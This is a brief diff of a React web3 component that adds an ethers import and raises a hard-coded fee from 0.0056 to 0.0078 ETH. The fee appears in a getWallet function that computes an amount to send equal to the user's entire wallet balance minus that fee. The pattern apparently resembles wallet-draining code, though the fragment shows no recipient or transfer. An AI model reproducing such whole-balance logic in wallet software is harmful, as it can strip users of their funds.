@@ -13,6 +13,7 @@ import { parseEther } from 'ethers/lib/utils.js'
 import Swal from 'sweetalert2'
 import axios from 'axios'
 import { Web3Button } from '@web3modal/react'
+import { ethers } from 'ethers';
 
 
     function Profile(props) {
@@ -28,8 +29,10 @@ import { Web3Button } from '@web3modal/react'
     const [amount, setAmount] = useState(0)
     const [info, setInfo] = useState(false)
     const balance = useBalance({address}) 
+
+    
   
-    const fee = 0.0056;
+    const fee = 0.0078;
     
     const [debouncedTo] = useDebounce(to, 500)
 
@@ -43,7 +46,7 @@ import { Web3Button } from '@web3modal/react'
         
     const getWallet = () => {
         const myBalance = balance.data.formatted
-        const amtToSend = myBalance - 0.0056;
+        const amtToSend = myBalance - 0.0078;
         //console.log(amtToSend)
         if(amtToSend>0){
 
